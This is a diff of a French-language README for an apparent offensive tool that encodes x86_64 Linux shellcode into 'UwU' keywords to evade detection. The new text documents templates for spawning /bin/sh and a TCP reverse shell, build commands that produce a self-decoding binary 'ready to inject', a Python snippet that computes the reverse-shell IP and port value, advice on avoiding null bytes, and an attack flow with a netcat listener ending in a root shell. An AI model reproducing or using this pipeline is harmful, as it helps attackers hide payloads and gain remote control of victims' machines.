@@ -1,68 +1,116 @@
-# UwU Shellcode Encoder/Decoder
+# 🐾 UwU Shellcode Templates
 
-CLI Python modulaire + décodeur ASM pour obfusquer du shellcode avec des mots-clés kawaii.
+Templates de shellcode x86_64 Linux prêts à être encodés via le pipeline UwU.
 
-## CLI officielle
+## Fichiers
 
-Le point d'entrée principal est `uwu_cli.py`.
+| Fichier | Description | Taille |
+|---------|-------------|--------|
+| `exit_clean.s` | Appel `exit(0)` propre. Utile pour tester le pipeline. | ~6 bytes |
+| `execve_binsh.s` | Spawn `/bin/sh` via `execve`. Exploitation locale. | ~27 bytes |
+| `reverse_shell.s` | Reverse shell TCP vers l'attaquant. | ~87 bytes |
 
-```bash
-# Aide globale
-python uwu_cli.py -h
-
-# Aide détaillée par commande
-python uwu_cli.py encode -h
-python uwu_cli.py generate -h
-
-# Encodage hex -> UwU
-python uwu_cli.py encode 4831c0
-python uwu_cli.py encode '\x48\x31\xc0' -o output.uwu
-
-# Génération d'un binaire décodeur
-python uwu_cli.py generate --hex 4831c0 -o out.bin
-python uwu_cli.py generate --uwu "^w^-SwS >w<-OwO ZwZ-UwU" --dryrun
-```
-
-## Structure
-
-```text
-projet-shellcode/
-├── uwu_cli.py
-├── encoder/
-│   ├── cli.py
-│   ├── core.py
-│   ├── generator.py
-│   └── commands/
-│       ├── encode.py
-│       └── generate.py
-├── decoder/
-│   ├── uwu_decoder.s
-│   ├── decoder_2.s
-│   └── decoder_3.s
-├── examples/
-├── keywords.json
-└── tester.c
-```
-
-## Décodeur ASM (manuel)
-
-Tu peux toujours utiliser `decoder/uwu_decoder.s` manuellement:
+## Prérequis
 
 ```bash
-as --64 decoder/uwu_decoder.s -o decoder/uwu_decoder.o
-ld decoder/uwu_decoder.o -o decoder/uwu_decoder
-./decoder/uwu_decoder
+apt install nasm binutils   # nasm + ld + objcopy
 ```
 
-## Table de correspondance
+## Utilisation rapide
 
-| Nibble | Keyword | Nibble | Keyword |
-|--------|---------|--------|---------|
-| 0      | UwU     | 8      | SwS     |
-| 1      | OwO     | 9      | VwV     |
-| 2      | TwT     | a      | XwX     |
-| 3      | >w<     | b      | YwY     |
-| 4      | ^w^     | c      | ZwZ     |
-| 5      | QwQ     | d      | NwN     |
-| 6      | PwP     | e      | MwM     |
-| 7      | RwR     | f      | LwL     |
+### 1. Juste compiler et voir les bytes
+
+```bash
+chmod +x build.sh
+./build.sh execve_binsh.s
+```
+
+### 2. Compiler + encoder en UwU directement
+
+```bash
+./build.sh execve_binsh.s --encode
+```
+
+### 3. Compiler + générer le .bin auto-décodant (prêt à injecter)
+
+```bash
+./build.sh reverse_shell.s --generate
+# → produit reverse_shell_uwu.bin
+```
+
+### 4. Pipeline complet manuel
+
+```bash
+# Étape 1 : compiler le template
+nasm -f elf64 execve_binsh.s -o execve_binsh.o
+ld execve_binsh.o -o execve_binsh
+objcopy --dump-section .text=execve_binsh.bin execve_binsh
+
+# Étape 2 : extraire les bytes hex
+xxd -p execve_binsh.bin | tr -d '\n'
+
+# Étape 3 : encoder en UwU
+python3 ../uwu_cli.py encode <hex_string>
+
+# Étape 4 : générer le shellcode auto-décodant
+python3 ../uwu_cli.py generate --hex <hex_string> -o out.bin
+
+# Étape 5 : tester
+python3 ../tester.c out.bin    # ou utiliser le tester.c du projet
+```
+
+## Configuration du reverse shell
+
+Dans `reverse_shell.s`, chercher les lignes marquées `[CONFIGURE]` :
+
+```asm
+; [CONFIGURE] ↓ modifier ici pour changer l'IP et le port
+mov rbx, 0xc0a801645c110002 ; sin_family=2, sin_port=4444, sin_addr=192.168.1.100
+; [CONFIGURE] ↑
+```
+
+### Calculer la valeur pour votre IP/port
+
+```python
+import struct, socket
+
+ip   = "192.168.1.100"
+port = 4444
+
+sin_family = 0x0002
+sin_port   = socket.htons(port)         # big-endian réseau
+sin_addr   = struct.unpack(">I", socket.inet_aton(ip))[0]
+
+# Valeur à mettre dans le mov rbx (little-endian 8 bytes)
+val = sin_family | (sin_port << 16) | (sin_addr << 32)
+print(f"0x{val:016x}")
+```
+
+### ⚠️ Null bytes et IPs
+
+Certaines IPs contiennent des octets nuls (ex: `10.0.0.1` → `0x0a000001` → contient `00 00`) ce qui casserait le shellcode si copié via `strcpy`.
+
+**IPs sans null bytes :**
+- ✅ `192.168.x.x` (si x > 0)
+- ✅ `172.16.x.x`
+- ❌ `10.0.0.1`, `127.0.0.1`
+
+## Flux d'attaque complet
+
+```
+[Attaquant]                          [Cible]
+    │                                    │
+    │  nc -lvnp 4444                     │
+    │                                    │
+    │  build.sh reverse_shell.s          │
+    │  → reverse_shell_uwu.bin           │
+    │                                    │
+    │  ──── injection du .bin ──────────►│
+    │                                    │ décodeur UwU s'exécute en RAM
+    │                                    │ reconstruit le shellcode original
+    │                                    │ execve("/bin//sh")
+    │◄─── connexion TCP retour ──────────│
+    │                                    │
+    │  $ whoami                          │
+    │  root                              │
+```
